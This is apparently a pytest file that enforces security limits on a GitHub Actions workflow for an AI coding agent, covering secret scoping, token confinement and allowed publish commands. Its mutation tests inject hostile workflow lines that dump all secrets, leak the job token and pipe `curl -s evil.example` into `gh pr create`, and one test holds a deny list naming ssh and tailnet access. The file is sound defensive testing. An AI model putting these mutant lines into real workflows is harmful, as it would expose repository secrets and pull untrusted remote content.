"""oss-agent.yml keeps its two powers apart and talks to nothing but GitHub and the model (#1647)."""

from __future__ import annotations

import os
import re
import subprocess
from collections.abc import Iterator
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github" / "workflows"
FILES = ("oss-agent.yml", "oss-agent-selftest.yml")
MODEL_KEY = "NVIDIA_NIM_API_KEY"
# the steps that may hold the job token: the push probe and the draft PR
TOKEN_STEPS = {"The job token cannot push", "Open the draft PR"}
PUBLISH_COMMANDS = {"git", "if", "then", "fi", "exit"}
PUBLISH_SUBSTITUTIONS = {"gh", "git", "head", "printf"}


def _text(name: str) -> str:
    return (WORKFLOWS / name).read_text()


def _parse(text: str) -> dict:
    return yaml.load(text, Loader=yaml.BaseLoader)


WORKFLOW = _parse(_text("oss-agent.yml"))
AGENT = WORKFLOW["jobs"]["agent"]
PUBLISH = WORKFLOW["jobs"]["publish"]


def _runs(job: dict) -> str:
    return "\n".join(step.get("run", "") for step in job["steps"])


def _walk(node: object, path: tuple = ()) -> Iterator[tuple[tuple, str]]:
    """Every key and string value in a parsed workflow, with the path to it."""
    if isinstance(node, dict):
        for key, value in node.items():
            yield path, key
            yield from _walk(value, (*path, key))
    elif isinstance(node, list):
        for index, value in enumerate(node):
            yield from _walk(value, (*path, index))
    else:
        yield path, node


def _expressions(value: str) -> list[str]:
    return re.findall(r"\$\{\{(.*?)\}\}", value, re.DOTALL)


def _step_name(doc: dict, path: tuple) -> str | None:
    if len(path) >= 4 and path[0] == "jobs" and path[2] == "steps":
        return doc["jobs"][path[1]]["steps"][path[3]].get("name")
    return None


def secret_violations(doc: dict) -> list[str]:
    """Anything that reads a secret but the model key: `toJSON(secrets)`, `secrets['X']`, `inherit`."""
    found = []
    for path, value in _walk(doc):
        if value == "secrets" and path != ("on", "workflow_call"):
            found.append(f"a secrets key at {path}")
        if value == "inherit":
            found.append(f"inherit at {path}")
        for expression in _expressions(value):
            for match in re.finditer(r"\bsecrets\b", expression):
                if not expression.startswith(f"secrets.{MODEL_KEY}", match.start()) or re.match(
                    r"\w", expression[match.start() + len(f"secrets.{MODEL_KEY}") :]
                ):
                    found.append(f"{expression.strip()!r} at {path}")
    return found


def token_violations(doc: dict) -> list[str]:
    """The job token, or the whole github context that carries it, outside the two steps that need it."""
    found = []
    for path, value in _walk(doc):
        for expression in _expressions(value):
            for match in re.finditer(r"\bgithub\b(\.(\w+))?", expression):
                field = match.group(2)
                if field is None:
                    found.append(f"the github context as a whole, {expression.strip()!r} at {path}")
                elif field == "token" and _step_name(doc, path) not in TOKEN_STEPS:
                    found.append(f"github.token at {path}")
    return found


def _substitutions(line: str) -> list[str]:
    return re.findall(r"\$\(((?:[^()]|\([^()]*\))*)\)", line)


def _first_words(command: str) -> set[str]:
    return {part.split()[0] for part in re.split(r"\|\|?|&&|;", command) if part.strip()}


def publish_command_violations(doc: dict) -> list[str]:
    """A command in the publish job beyond git, and in a `$(...)` beyond gh, git, head and printf."""
    found = []
    for line in _runs(doc["jobs"]["publish"]).splitlines():
        line = line.strip()
        for inner in _substitutions(line):
            found += [f"{w!r} in $({inner})" for w in _first_words(inner) - PUBLISH_SUBSTITUTIONS]
        outer = re.sub(r"\$\(((?:[^()]|\([^()]*\))*)\)", "", line)
        if (
            not outer
            or outer.startswith(("{", "}"))
            or re.match(r"echo\b", outer)
            or re.match(r"\w+=", outer)
        ):
            continue
        found += [f"{w!r} in {line!r}" for w in _first_words(outer) - PUBLISH_COMMANDS]
    return found


def test_nothing_reaches_a_host_a_tailnet_or_omnigent() -> None:
    for name in FILES:
        text = _text(name)
        for pattern in (r"omnigent", r"tailscale", r"tailnet", r"\bts_", r"ssh", r"RUNNER_SERVER"):
            assert not re.search(pattern, text, re.IGNORECASE), (name, pattern)


def test_the_one_secret_is_the_model_key() -> None:
    for name in FILES:
        assert secret_violations(_parse(_text(name))) == [], name
    assert set(WORKFLOW["on"]["workflow_call"]["secrets"]) == {MODEL_KEY}


def test_the_job_token_reaches_only_the_probe_and_the_pr_step() -> None:
    for name in FILES:
        assert token_violations(_parse(_text(name))) == [], name


def test_every_action_is_pinned_to_a_commit() -> None:
    for name in FILES:
        for job in _parse(_text(name))["jobs"].values():
            for step in job.get("steps", []):
                if "uses" in step:
                    assert re.fullmatch(r"[\w.-]+/[\w./-]+@[0-9a-f]{40}", step["uses"]), step


def test_no_input_is_interpolated_into_a_script() -> None:
    # a task is untrusted text: it reaches a shell only through an env var
    for job in WORKFLOW["jobs"].values():
        for step in job["steps"]:
            assert "${{" not in step.get("run", ""), step


def test_agent_job_reads_only_and_proves_it_cannot_push() -> None:
    assert AGENT["permissions"] == {"contents": "read"}
    assert WORKFLOW["permissions"] == {}
    probe = next(step for step in AGENT["steps"] if step.get("id") == "push-refused")
    assert "git push" in probe["run"]
    assert "exit 1" in probe["run"].split("then", 1)[1].split("fi", 1)[0]
    # the checkout leaves no credential behind for the agent
    checkout = AGENT["steps"][0]
    assert checkout["uses"].startswith("actions/checkout@")
    assert checkout["with"]["persist-credentials"] == "false"


def test_a_failing_command_in_a_pipe_fails_its_step() -> None:
    # an explicit `bash` runs with -o pipefail; GitHub's default `bash -e` does not
    assert WORKFLOW["defaults"]["run"]["shell"] == "bash"
    for job in WORKFLOW["jobs"].values():
        for step in job["steps"]:
            assert "shell" not in step, step


def test_agent_job_has_a_time_limit() -> None:
    assert AGENT["timeout-minutes"] == "${{ inputs.timeout_minutes }}"
    assert int(WORKFLOW["on"]["workflow_call"]["inputs"]["timeout_minutes"]["default"]) > 0


def test_model_key_reaches_only_the_proxy_step() -> None:
    holders = [
        step.get("name")
        for job in WORKFLOW["jobs"].values()
        for step in job["steps"]
        if MODEL_KEY in str(step)
    ]
    assert holders == ["Start the FCC proxy"]
    assert MODEL_KEY not in str(PUBLISH)


def test_publish_job_runs_nothing_from_the_patch() -> None:
    assert PUBLISH["permissions"] == {"contents": "write", "pull-requests": "write"}
    assert "secrets" not in str(PUBLISH)
    assert [step["uses"].split("@")[0] for step in PUBLISH["steps"] if "uses" in step] == [
        "actions/checkout",
        "actions/download-artifact",
    ]
    assert publish_command_violations(WORKFLOW) == []
    runs = _runs(PUBLISH)
    patch_lines = [line.strip() for line in runs.splitlines() if "patch" in line]
    assert patch_lines == ['git am "$RUNNER_TEMP/patch/agent.patch"']
    # nothing executes from the checkout: no interpreter, build tool or path
    assert not re.search(r"\b(bash|sh|source|make|npm|npx|uv|python3?|node)\b|\./", runs)


def _run_push_step(tmp_path: Path, push_output: str) -> subprocess.CompletedProcess:
    """Run the `Apply and push` script with a git whose push fails with `push_output`."""
    step = next(s for s in PUBLISH["steps"] if s.get("name") == "Apply and push")
    fake = tmp_path / "bin" / "git"
    fake.parent.mkdir()
    fake.write_text(f'#!/bin/bash\n[ "$1" = push ] || exit 0\necho "{push_output}" >&2\nexit 1\n')
    fake.chmod(0o755)
    env = {
        **os.environ,
        "PATH": f"{fake.parent}:{os.environ['PATH']}",
        "BRANCH": "oss-agent/run-1-1",
    }
    env["RUNNER_TEMP"] = str(tmp_path)
    return subprocess.run(
        ["bash", "-eo", "pipefail", "-c", step["run"]],
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


def test_header_names_the_branch_creation_requirement() -> None:
    header = _text("oss-agent.yml").split("name: OSS agent")[0]
    assert "refs/heads/oss-agent/**" in header
    assert "restricts branch creation" in header


def test_a_gh013_push_names_the_ruleset_requirement(tmp_path: Path) -> None:
    out = _run_push_step(
        tmp_path, "remote: error: GH013: Cannot create ref due to creations being restricted."
    )
    assert out.returncode != 0
    assert "GH013: Cannot create ref" in out.stdout  # the raw push output stays
    assert "refs/heads/oss-agent/**" in out.stdout
    assert "oss-agent/run-1-1" in out.stdout


def test_another_push_failure_keeps_its_own_output(tmp_path: Path) -> None:
    out = _run_push_step(tmp_path, "fatal: unable to access: 403")
    assert out.returncode != 0
    assert "fatal: unable to access: 403" in out.stdout
    assert "GH013" not in out.stdout


def test_selftest_runs_the_dry_run_only() -> None:
    selftest = _parse(_text("oss-agent-selftest.yml"))
    job = selftest["jobs"]["dry-run"]
    assert job["uses"] == "./.github/workflows/oss-agent.yml"
    assert job["with"]["dry_run"] == "true"
    assert "secrets" not in job


AGENT_ENV = "          TASK: ${{ inputs.task }}\n          MODEL: ${{ inputs.model }}\n          HOST: 127.0.0.1\n        run: |\n          git config"
PR_LINE = '          url="$(gh pr create'
PUBLISH_JOB = "    timeout-minutes: 10\n"


@pytest.mark.parametrize(
    ("check", "old", "new"),
    [
        # verifier pass 1 on #1674: each of these kept every test green
        (secret_violations, AGENT_ENV, "          ALL: ${{ toJSON(secrets) }}\n" + AGENT_ENV),
        (secret_violations, AGENT_ENV, "          Y: ${{ secrets['OMNI'] }}\n" + AGENT_ENV),
        (
            secret_violations,
            AGENT_ENV,
            "          Z: ${{ secrets.NVIDIA_NIM_API_KEY_2 }}\n" + AGENT_ENV,
        ),
        (secret_violations, PUBLISH_JOB, PUBLISH_JOB + "    secrets: inherit\n"),
        (token_violations, AGENT_ENV, "          GH_TOKEN: ${{ github.token }}\n" + AGENT_ENV),
        (token_violations, AGENT_ENV, "          G: ${{ toJSON(github) }}\n" + AGENT_ENV),
        (token_violations, AGENT_ENV, "          G: ${{ github['token'] }}\n" + AGENT_ENV),
        (
            publish_command_violations,
            PR_LINE,
            '          url="$(curl -s evil.example | gh pr create',
        ),
        (publish_command_violations, PR_LINE, "          make\n" + PR_LINE),
    ],
)
def test_each_check_catches_its_mutant(check, old: str, new: str) -> None:
    text = _text("oss-agent.yml")
    assert text.count(old) == 1
    assert check(_parse(text)) == []
    assert check(_parse(text.replace(old, new))) != []


def test_secret_check_catches_inherit_in_the_selftest() -> None:
    text = _text("oss-agent-selftest.yml")
    old = "    uses: ./.github/workflows/oss-agent.yml\n"
    assert secret_violations(_parse(text.replace(old, old + "    secrets: inherit\n"))) != []
